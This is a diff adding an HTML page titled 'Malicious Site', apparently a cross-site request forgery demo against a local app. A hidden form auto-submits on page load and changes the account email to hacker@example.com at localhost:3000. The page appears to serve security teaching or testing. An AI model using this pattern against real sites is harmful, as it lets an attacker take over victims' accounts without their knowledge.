@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Malicious Site</title>
+</head>
+<body>
+    <form action="http://localhost:3000/account-settings/change-email" method="post">
+        <input type="email" name="email" value="hacker@example.com" hidden>
+    </form>
+
+    <script>document.forms[0].submit();</script>
+</body>
+</html>
